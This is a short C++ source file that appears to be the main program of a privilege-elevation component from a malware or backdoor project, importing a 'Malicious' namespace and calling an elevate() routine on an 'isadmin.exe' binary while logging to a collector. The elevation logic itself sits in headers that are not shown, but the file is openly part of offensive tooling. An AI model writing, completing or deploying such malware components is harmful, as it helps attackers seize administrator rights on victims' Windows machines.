#include <common/Log.hpp>
using namespace Common;

#include <system/Process.hpp>
#include <Innocence.hpp>

#include <malicious/Elevator.hpp>
using namespace Malicious;

int main(int argc, char *argv[])
{
	try
	{
		LOG.setHeader(Innocence::ELEVATOR_AUDIT_HEADER);
		LOG.addObserver(new Common::LogToCollector);
		System::Process::This thisProcess;
		return elevate(thisProcess.getProgramDir()+"\\isadmin.exe");
    }
    catch(Common::Exception&)
    {
    }
	CATCH_UNKNOWN_EXCEPTION
	return EXIT_FAILURE;
}
